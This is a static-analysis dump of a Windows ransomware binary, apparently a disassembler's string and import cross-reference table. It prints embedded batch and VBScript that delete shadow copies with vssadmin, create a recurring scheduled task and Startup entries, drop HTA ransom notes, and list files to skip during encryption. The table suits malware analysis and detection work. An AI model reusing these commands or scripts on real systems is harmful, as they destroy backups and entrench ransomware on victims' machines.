reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x404959	0x4cb0a0	import	0x4047b0	KERNEL32.dll.ReleaseSemaphore
0x404972	0x47bc4b	string	0x4047b0	;\r$AP
0x404f52	0x4dfe54	string	0x404f20	NameValuePairs: type mismatch for '
0x404f72	0x4dfe48	string	0x404f20	', stored '
0x405003	0x4dfe30	string	0x404f20	', trying to retrieve '
0x405565	0x4dfe78	string	0x405540	Clone() is not implemented yet.
0x40563c	0x4dfe98	string	0x405630	unknown
0x405715	0x4dfea4	string	0x4056e0	: this object doesn't support resynchronization
0x4057a5	0x4dfed8	string	0x405780	StreamTransformation: this object doesn't support random access
0x405945	0x4dff18	string	0x405920	RandomNumberGenerator: IncorporateEntropy not implemented
0x4059f5	0x4dff54	string	0x4059d0	BufferedTransformation: this object is not attachable
0x405b45	0x4dffc0	string	0x405b20	CryptoMaterial: this object does not support precomputation
0x405cc5	0x4e0000	string	0x405ca0	GeneratableCryptoMaterial: this object does not support key/parameter generation
0x405e4b	0x4e0060	string	0x405e00	AlgorithmParametersBase: parameter "
0x405ea7	0x4e0054	string	0x405e00	" not used
0x4065da	0x4e0088	string	0x406520	InputBuffer
0x40667c	0x4e0088	string	0x406520	InputBuffer
0x406906	0x4e00a4	string	0x406900	EncodingParameters
0x407030	0x47bc4b	string	0x406e40	;\r$AP
0x4072c2	0x4e0190	string	0x407280	CipherModeBase: feedback size cannot be specified for this cipher mode
0x407428	0x4e01dc	string	0x4073f0	/GCM
0x407666	0x4e01e8	string	0x4075e0	empty
0x4076ba	0x47bc4b	string	0x4075e0	;\r$AP
0x407939	0x4cb018	import	0x4078e0	KERNEL32.dll.SetErrorMode
0x4080e7	0x47bc4b	string	0x4078e0	;\r$AP
0x408749	0x4cb018	import	0x4086f0	KERNEL32.dll.SetErrorMode
0x408fcd	0x47bc4b	string	0x4086f0	;\r$AP
0x409049	0x4cb018	import	0x408ff0	KERNEL32.dll.SetErrorMode
0x4097d5	0x47bc4b	string	0x408ff0	;\r$AP
0x409b77	0x4e01f4	string	0x409800	nqpso5938fh71jfu
0x40a08b	0x47bc4b	string	0x409800	;\r$AP
0x40a15a	0x47bc4b	string	0x40a0b0	;\r$AP
0x40a1ad	0x47bc4b	string	0x40a0b0	;\r$AP
0x40a430	0x4e0274	string	0x40a380	GET /
0x40a44a	0x4e0260	string	0x40a380	HTTP/1.1\r\nHost:
0x40a4bc	0x4e0248	string	0x40a380	\r\nConnection: close\r\n\r\n
0x40a6aa	0x4cb29c	import	0x40a380	WS2_32.dll.WSAStartup
0x40a6ca	0x4cb294	import	0x40a380	WS2_32.dll.socket
0x40a6e2	0x4cb2a4	import	0x40a380	WS2_32.dll.gethostbyname
0x40a6ef	0x4cb2b4	import	0x40a380	WS2_32.dll.htons
0x40a724	0x4cb2a0	import	0x40a380	WS2_32.dll.connect
0x40a789	0x4cb298	import	0x40a380	WS2_32.dll.send
0x40a7b4	0x4cb2b0	import	0x40a380	WS2_32.dll.recv
0x40a833	0x4cb2b0	import	0x40a380	WS2_32.dll.recv
0x40a83e	0x4cb2a8	import	0x40a380	WS2_32.dll.closesocket
0x40a844	0x4cb2ac	import	0x40a380	WS2_32.dll.WSACleanup
0x40a958	0x47bc4b	string	0x40a380	;\r$AP
0x40aa14	0x4e0288	string	0x40a970	slow
0x40abbd	0x4e02c8	string	0x40a970	:\Users\
0x40ad3b	0x4e02dc	string	0x40a970	Desktopini.exe
0x40aec4	0x4e02fc	string	0x40a970	a5m6f
0x40aee7	0x4e02fc	string	0x40a970	a5m6f
0x40af07	0x4e0308	string	0x40a970	kaj3n
0x40b0fc	0x4e0318	string	0x40a970	"%SystemDrive%\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
0x40b126	0x4e03d8	string	0x40a970	"%SystemDrive%\Users\%username%\Desktop\
0x40b15c	0x4e0430	string	0x40a970	"%SystemDrive%\Documents and Settings\%username%\Desktop\
0x40b16b	0x4e04a8	string	0x40a970	"%SystemDrive%\Documents and Settings\%username%\Start Menu\Programs\Startup\
0x40b18e	0x4e02dc	string	0x40a970	Desktopini.exe
0x40b1ae	0x4e0544	string	0x40a970	rem a5m6f
0x40b1c4	0x4e0308	string	0x40a970	kaj3n
0x40b297	0x4e0c58	string	0x40a970	@echo off\r\ntasklist /v | find /I /c "dcdcf" > nul\r\nif "%ERRORLEVEL%" == "0" goto ErrorAlreadyRunning\r\nset lend=deb\r\nvssadmin.exe Delete Shadows /All /Quiet\r\ntitle dcdcf\r\ngoto notend\r\n:ErrorAlreadyRunning\r\nexit\r\n:secthree\r\ntasklist /fi "ImageName eq
0x40b2ad	0x4e0b00	string	0x40a970	" /fo csv 2>NUL | find /I "
0x40b359	0x4e0b90	string	0x40a970	">NUL\r\nif "%ERRORLEVEL%"=="0" goto imer\r\nif %lend% == bed (goto akakak)\r\nset lend=bed\r\nIF EXIST
0x40b413	0x4e0978	string	0x40a970	Desktopini.exe" (\r\nstart /d
0x40b4b9	0x4e0954	string	0x40a970	" Desktopini.exe
0x40b56f	0x4e0b38	string	0x40a970	\r\n)\r\n:secttwo\r\ntasklist /fi "ImageName eq
0x40b61f	0x4e0b00	string	0x40a970	" /fo csv 2>NUL | find /I "
0x40b6cf	0x4e0a28	string	0x40a970	">NUL\r\nif "%ERRORLEVEL%"=="0" goto notend\r\ngoto secton\r\n:notend\r\ntimeout /t 15 /nobreak >NUL\r\nIF NOT EXIST
0x40b77f	0x4e09b8	string	0x40a970	ReadMe_Now!.hta" (\r\ngoto secttwo\r\n:secton\r\nIF EXIST
0x40b82f	0x4e0978	string	0x40a970	Desktopini.exe" (\r\nstart /d
0x40b8e3	0x4e0954	string	0x40a970	" Desktopini.exe
0x40b995	0x4e092c	string	0x40a970	\r\n)\r\nIF NOT EXIST
0x40ba45	0x4e08f0	string	0x40a970	Desktopini.exe" (\r\nIF EXIST "
0x40bdc3	0x4e0838	string	0x40a970	\r\n)\r\n)\r\ngoto notend\r\n)\r\n:imer\r\ntimeout /t 90 /nobreak >NUL\r\nIF EXIST
0x40be63	0x4e07d8	string	0x40a970	ReadMe_Now!.hta" (\r\ngoto secthree\r\n)\r\n:akakak\r\n
0x40bece	0x4e0558	string	0x40a970	\r\nschtasks /delete /tn Microsoft_Auto_Scheduler /f\r\nIF EXIST "%SystemDrive%\Users\%username%\AppData\v9_svc.vbs" (\r\nDEL "%SystemDrive%\Users\%username%\AppData\v9_svc.vbs" /f\r\n)\r\nIF EXIST "%SystemDrive%\Users\%username%\AppData\t2_svc.bat" (\r\nDEL "%SystemDrive%\Users\%username%\AppData\t2_svc.bat" /f\r\n)\r\nDEL "%~f0" /f
0x40c0c4	0x4e02c8	string	0x40a970	:\Users\
0x40c0ec	0x4e0e4c	string	0x40a970	\AppData\v9_svc.vbs
0x40c11f	0x4e0e78	string	0x40a970	Dim strScript\r\nDim oExec, oWshShell\r\nDim ComSpec\r\nSet oWshShell = CreateObject("WScript.Shell")\r\nComSpec = oWshShell.ExpandEnvironmentStrings("%comspec%")\r\nstrScript = ComSpec & " /C echo %SystemDrive%\Users\%username%\AppData\h4_svc.bat"\r\nSet oExec = oWshShell.Exec (strScript)\r\nDim outputsxc\r\noutputsxc = oExec.StdOut.ReadAll()\r\nSet fso = CreateObject("Scripting.FileSystemObject")\r\noutputsxc = Replace(outputsxc, vbCr, "")\r\noutputsxc = Replace(outputsxc, vbLf, "")\r\nIf (fso.FileExists(outputsxc)) Then\r\nSet WinScriptHost = CreateObject("WScript.Shell")\r\nWinScriptHost.Run Chr(34) & "%SystemDrive%\Users\%username%\AppData\h4_svc.bat" & Chr(34), 0\r\nSet WinScriptHost = Nothing\r\nEnd If
0x40c178	0x4e02c8	string	0x40a970	:\Users\
0x40c1a0	0x4e1128	string	0x40a970	\AppData\t2_svc.bat
0x40c1d3	0x4e1150	string	0x40a970	@echo off\r\nIF EXIST "%SystemDrive%\Users\%username%\AppData\v9_svc.vbs" (\r\nstart "" "%SystemDrive%\Users\%username%\AppData\v9_svc.vbs"\r\n)
0x40c22c	0x4e11dc	string	0x40a970	cd "%SystemDrive%\Users\%username%\AppData\"&t2_svc.bat
0x40c23f	0x4e1218	string	0x40a970	schtasks /create /sc minute /mo 6 /tn "Microsoft_Auto_Scheduler" /tr "'C:\Users\%username%\AppData\t2_svc.bat'" /f
0x40c32e	0x47bc4b	string	0x40a970	;\r$AP
0x40c54f	0x4cb0ac	import	0x40c4f0	KERNEL32.dll.FindFirstFileW
0x40c664	0x4cb0a4	import	0x40c4f0	KERNEL32.dll.FindNextFileW
0x40c7a9	0x47bc4b	string	0x40c4f0	;\r$AP
0x40c99b	0x4e1290	string	0x40c7c0	udij=
0x40cbad	0x4e12b0	string	0x40c7c0	d7j3
0x40cbc0	0x4e12a8	string	0x40c7c0	y9a0
0x40cc2b	0x4e12a0	string	0x40c7c0	m5ha
0x40d336	0x4e12cc	string	0x40c7c0	[ID=
0x40dcf5	0x47bc4b	string	0x40c7c0	;\r$AP
0x40de1d	0x4e49bc	string	0x40dd40	_Enc
0x40de43	0x4e12cc	string	0x40dd40	[ID=
0x40deba	0x4e4a38	string	0x40dd40	\Documents and Settings\
0x40df41	0x4e49c8	string	0x40dd40	\Local Settings\Application Data\Microsoft\Credentials
0x40dfc4	0x40e010	string	0x40dd40	h8JN
0x40dfd7	0x40e010	string	0x40dd40	h8JN
0x40e010	0x4e4a38	string	0x40dd40	\Documents and Settings\
0x40e09a	0x4e4a70	string	0x40dd40	\Application Data\Microsoft\Credentials
0x40e150	0x4e4ac0	string	0x40dd40	\Users\All Users\Microsoft\Windows\Caches
0x40e1e0	0x4e4b14	string	0x40dd40	\ProgramData
0x40e23c	0x40e270	string	0x40dd40	h0KN
0x40e257	0x40e270	string	0x40dd40	h0KN
0x40e270	0x4e4b30	string	0x40dd40	\Recovery
0x40e2cc	0x40e300	string	0x40dd40	hDKN
0x40e2e7	0x40e300	string	0x40dd40	hDKN
0x40e300	0x4e4b44	string	0x40dd40	\ProgramData\Microsoft
0x40e35c	0x40e390	string	0x40dd40	htKN
0x40e377	0x40e390	string	0x40dd40	htKN
0x40e390	0x4e4b74	string	0x40dd40	\Windows
0x40e3ec	0x40e420	string	0x40dd40	h8JN
0x40e407	0x40e420	string	0x40dd40	h8JN
0x40e420	0x4e4a38	string	0x40dd40	\Documents and Settings\
0x40e4aa	0x4e4b88	string	0x40dd40	\Local Settings\Temporary Internet Files
0x40e52d	0x40e560	string	0x40dd40	h8JN
0x40e547	0x40e560	string	0x40dd40	h8JN
0x40e560	0x4e4a38	string	0x40dd40	\Documents and Settings\
0x40e5ea	0x4e4bdc	string	0x40dd40	\Start Menu
0x40e6a0	0x4e4bf8	string	0x40dd40	\Documents and Settings\All Users\Start Menu
0x40e6fc	0x40e730	string	0x40dd40	hTLN
0x40e717	0x40e730	string	0x40dd40	hTLN
0x40e730	0x4e4c54	string	0x40dd40	\WINDOWS
0x40e78c	0x40e7c0	string	0x40dd40	hhLN
0x40e7a7	0x40e7c0	string	0x40dd40	hhLN
0x40e7c0	0x4e4c68	string	0x40dd40	\Boot
0x40e81c	0x40e850	string	0x40dd40	htLN
0x40e837	0x40e850	string	0x40dd40	htLN
0x40e850	0x4e4c74	string	0x40dd40	\$RECYCLE.BIN
0x40e8dd	0x4e4c90	string	0x40dd40	\System Volume Information
0x40f4b9	0x4e4cc8	string	0x40dd40	f__d_d.sys
0x40f4ec	0x4e4ce0	string	0x40dd40	t2_svc.bat
0x40f51f	0x4e4cf8	string	0x40dd40	v9_svc.vbs
0x40f55a	0x4e4d10	string	0x40dd40	h4_svc.bat
0x40f58d	0x4e4d28	string	0x40dd40	Renc.sys
0x40f5c0	0x4e4d3c	string	0x40dd40	ReadMe_Now!.hta
0x40f5fa	0x4e4d5c	string	0x40dd40	io.sys
0x40f62d	0x4e4d6c	string	0x40dd40	ntdetect.com
0x40f660	0x4e4d88	string	0x40dd40	ntldr
0x40f69a	0x4e4d94	string	0x40dd40	RCRU_64.exe
0x40f6cd	0x4e4dac	string	0x40dd40	bootfont.bin
0x40f700	0x4e4dc8	string	0x40dd40	Read_Me!_.txt
0x40f73a	0x4e02dc	string	0x40dd40	Desktopini.exe
0x40f76d	0x4e4de4	string	0x40dd40	bootmgr
0x40f7a0	0x4e4df4	string	0x40dd40	Pagesfilo.sys
0x40f7da	0x4e4e10	string	0x40dd40	explorer.exe
0x40f80d	0x4e4e2c	string	0x40dd40	desktop.ini
0x40f83d	0x4e4e44	string	0x40dd40	BOOTSECT.BAK
0x40f871	0x4e4e60	string	0x40dd40	boot.ini
0x410257	0x4e49bc	string	0x40dd40	_Enc
0x4102d6	0x4e49bc	string	0x40dd40	_Enc
0x410a2e	0x47bc4b	string	0x40dd40	;\r$AP
0x410a8e	0x4e02c8	string	0x410a50	:\Users\
0x410d07	0x4cb024	import	0x410a50	KERNEL32.dll.GetFileAttributesW
0x410d12	0x4cb0b4	import	0x410a50	KERNEL32.dll.CreateDirectoryW
0x410d51	0x4cb024	import	0x410a50	KERNEL32.dll.GetFileAttributesW
0x410d5f	0x4cb0b4	import	0x410a50	KERNEL32.dll.CreateDirectoryW
0x410d6b	0x4cb0b4	import	0x410a50	KERNEL32.dll.CreateDirectoryW
0x410d7a	0x4cb0b4	import	0x410a50	KERNEL32.dll.CreateDirectoryW
0x410d81	0x4cb024	import	0x410a50	KERNEL32.dll.GetFileAttributesW
0x410f0d	0x47bc4b	string	0x410a50	;\r$AP
0x410f87	0x4cb028	import	0x410f30	KERNEL32.dll.GetSystemDirectoryW
0x41107c	0x47bc4b	string	0x410f30	;\r$AP
0x4110d3	0x4cb00c	import	0x411090	ADVAPI32.dll.GetUserNameW
0x411271	0x47bc4b	string	0x411090	;\r$AP
0x411301	0x4cb02c	import	0x411280	KERNEL32.dll.GetComputerNameExW
0x4113a0	0x4cb260	import	0x411280	NETAPI32.dll.DsRoleGetPrimaryDomainInformation
0x4113ac	0x4e4e8c	string	0x411280	Empty
0x4113f1	0x4e4e8c	string	0x411280	Empty
0x4118a2	0x47bc4b	string	0x411280	;\r$AP
0x41197e	0x4e4ea0	string	0x4118c0	MIIBoDANBgkqhkiG9w0BAQEFAAOCAY0AMIIBiAKCAYEAvaM2Ua4pHP8HGmZPaHrRFJomoH2c/4Ysc3XdG9WnWW1K23qOPhyQFHNzG2hUdhLynlwGsqapcC1inwu9cVh+oh5p8PR486FMdXCWUm+WfFNNw0xGWBejd8CIHdBl0eHPT0X3XYGpFLV7xg2NiYe551ff1m4tsYZ9ZQqOEA/GpxXG76BZFPRAuz/ySNbnskKx3gxGuq55vh/qjCFLixUmUnB/tv3lkrdExF7D6ItrKdvuWFrs8B39CdpwvtAfjNJGOiTK2EmvlcRgNBlO+5C4Mz1hGSGCnbBFsW6vL9wZEjg1WM2+qxqfY79dk15OAfgKWD2St/IxUTNNwnZJqlUPyZ+yCwsprxjpFsfNSRXmJpS8pqv81H2rZua6B0e0R4dZnfJq0F0f0FZzZ4FTsobO/w3Ze+BWFr5iY+eaLoXKk8CfUuLNq8SnMrK3SNHDXnY+wLuh0z8qp6w8eUp+nAYUMIYwSdWRX2/LyaGAG7Ar1Khn1ZRP8gv4D7XM7DbGvqqLAgER
0x411cbe	0x4e50d4	string	0x4118c0	J7x23
0x411f18	0x47bc4b	string	0x4118c0	;\r$AP
0x411f6d	0x4cb054	import	0x411f40	KERNEL32.dll.GlobalMemoryStatusEx
0x41200d	0x47bc4b	string	0x411f40	;\r$AP
0x412085	0x4cb264	import	0x412020	NETAPI32.dll.NetUserEnum
0x41211f	0x4cb268	import	0x412020	NETAPI32.dll.NetApiBufferFree
0x41212f	0x4cb268	import	0x412020	NETAPI32.dll.NetApiBufferFree
0x412170	0x47bc4b	string	0x412020	;\r$AP
0x412c82	0x47bc4b	string	0x412180	;\r$AP
0x412d27	0x4cb28c	import	0x412ce0	USER32.dll.GetWindowTextLengthA
0x412df9	0x4cb284	import	0x412ce0	USER32.dll.GetWindowTextA
0x4130e4	0x47bc4b	string	0x412ce0	;\r$AP
0x4131f8	0x4cb278	import	0x4131c0	SHLWAPI.dll.PathIsNetworkPathA
0x413242	0x4cb030	import	0x4131c0	KERNEL32.dll.MultiByteToWideChar
0x413263	0x4cb03c	import	0x4131c0	KERNEL32.dll.GetDiskFreeSpaceExW
0x4132b3	0x47bc4b	string	0x4131c0	;\r$AP
0x4132d2	0x47bc4b	string	0x4131c0	;\r$AP
0x4132fc	0x4e510c	string	0x4132e0	GetLogicalProcessorInformation
0x413301	0x4e512c	string	0x4132e0	kernel32
0x41331a	0x4cb0b0	import	0x4132e0	KERNEL32.dll.GetModuleHandleW
0x413321	0x4cb04c	import	0x4132e0	KERNEL32.dll.GetProcAddress
0x41332f	0x4e5140	string	0x4132e0	\nGetLogicalProcessorInformation is not supported.\n
0x413344	0x47bc4b	string	0x4132e0	;\r$AP
0x41334d	0x4cb034	import	0x4132e0	KERNEL32.dll.GetLastError
0x41338d	0x4e51a8	string	0x4132e0	\nError: Allocation failure\n
0x4133a2	0x47bc4b	string	0x4132e0	;\r$AP
0x4133ae	0x4e51e0	string	0x4132e0	\nError %d\n
0x4133c3	0x47bc4b	string	0x4132e0	;\r$AP
0x4135ab	0x47bc4b	string	0x4132e0	;\r$AP
0x4135ea	0x47bc4b	string	0x4132e0	;\r$AP
0x41361f	0x4cb054	import	0x413600	KERNEL32.dll.GlobalMemoryStatusEx
0x41366f	0x47bc4b	string	0x413600	;\r$AP
0x413683	0x47bc4b	string	0x413600	;\r$AP
0x413697	0x47bc4b	string	0x413600	;\r$AP
0x4136ab	0x47bc4b	string	0x413600	;\r$AP
0x4136bf	0x47bc4b	string	0x413600	;\r$AP
0x413743	0x4e51f8	string	0x413700	Address:
0x413832	0x47bc4b	string	0x413700	;\r$AP
0x413c29	0x4cb018	import	0x413bf0	KERNEL32.dll.SetErrorMode
0x413d47	0x4e02c8	string	0x413bf0	:\Users\
0x413db9	0x4e52e8	string	0x413bf0	\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ReadMe_Now!.hta
0x413f81	0x4e02c8	string	0x413bf0	:\Users\
0x413fed	0x4e5388	string	0x413bf0	\Desktop\ReadMe_Now!.hta
0x414210	0x4e02c8	string	0x413bf0	:\Users\
0x414273	0x4e52e8	string	0x413bf0	\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ReadMe_Now!.hta
0x414375	0x4cb024	import	0x413bf0	KERNEL32.dll.GetFileAttributesW
0x4144a0	0x4e02c8	string	0x413bf0	:\Users\
0x41450c	0x4e53bc	string	0x413bf0	\Desktop\
0x41461a	0x4cb024	import	0x413bf0	KERNEL32.dll.GetFileAttributesW
0x414629	0x4e4d3c	string	0x413bf0	ReadMe_Now!.hta
0x4147a8	0x4e53d0	string	0x413bf0	:\Documents and Settings\
0x41480b	0x4e53bc	string	0x413bf0	\Desktop\
0x41490d	0x4cb024	import	0x413bf0	KERNEL32.dll.GetFileAttributesW
0x41491c	0x4e4d3c	string	0x413bf0	ReadMe_Now!.hta
0x414b94	0x4e5408	string	0x413bf0	kharactern4y4&
0x414db8	0x4cb270	import	0x413bf0	SHELL32.dll.ShellExecuteW
0x414de1	0x4e53d0	string	0x413bf0	:\Documents and Settings\
0x414e59	0x4e5388	string	0x413bf0	\Desktop\ReadMe_Now!.hta
0x415070	0x4e53d0	string	0x413bf0	:\Documents and Settings\
0x4150e8	0x4e5418	string	0x413bf0	\Start Menu\Programs\Startup\ReadMe_Now!.hta
0x415528	0x47bc4b	string	0x413bf0	;\r$AP
0x4158ef	0x4cb064	import	0x4158b0	KERNEL32.dll.GetConsoleWindow
0x4158f8	0x4cb280	import	0x4158b0	USER32.dll.ShowWindow
0x415900	0x4cb018	import	0x4158b0	KERNEL32.dll.SetErrorMode
0x41590b	0x4cb074	import	0x4158b0	KERNEL32.dll.SetConsoleTitleW
0x415927	0x4cb288	import	0x4158b0	USER32.dll.EnumWindows
0x41593a	0x4e5474	string	0x4158b0	tasklist /v /fo csv | findstr /i "dcdcf"
0x415971	0x4e54a0	string	0x4158b0	dcdcf
0x415994	0x4e54a8	string	0x4158b0	"cmd.exe","
0x415a38	0x4e54bc	string	0x4158b0	taskkill /PID
0x415d30	0x4e54cc	string	0x4158b0	slow
0x415dd7	0x4cb058	import	0x4158b0	KERNEL32.dll.GetModuleFileNameW
0x415e3a	0x4e02c8	string	0x4158b0	:\Users\
0x415e8a	0x4e54d8	string	0x4158b0	Version 5.
0x416234	0x4e54ec	string	0x4158b0	nslookup myip.opendns.com. resolver1.opendns.com
0x416272	0x4e556c	string	0x4158b0	Write Us E-mail At :
0x416285	0x4e5520	string	0x4158b0	<br><br> Check Your Spam Folder Too.
0x4162c0	0x4e5598	string	0x4158b0	Contact Us In Telegram , ID :
0x4162e9	0x4e02c8	string	0x4158b0	:\Users\
0x41631b	0x4e55d8	string	0x4158b0	\AppData\Pagesfilo.sys
0x41634e	0x4e5608	string	0x4158b0	:\Windows\Pagesfilo.sys
0x416490	0x4e5638	string	0x4158b0	n7t0
0x4164a0	0x4e5640	string	0x4158b0	p2h6
0x41653e	0x4e5640	string	0x4158b0	p2h6
0x416551	0x4e5648	string	0x4158b0	u4g8
0x4165dd	0x4e5648	string	0x4158b0	u4g8
0x4165f6	0x4e5650	string	0x4158b0	h2gq
0x416754	0x416c7d	string	0x4158b0	h LP
0x41676a	0x416c7d	string	0x4158b0	h LP
0x416a3e	0x4e5638	string	0x4158b0	n7t0
0x416a57	0x4e5640	string	0x4158b0	p2h6
0x416b39	0x4e5648	string	0x4158b0	u4g8
0x416b76	0x4e5650	string	0x4158b0	h2gq
0x416c82	0x4ea548	string	0x4158b0	<!DOCTYPE html><html><head><title>
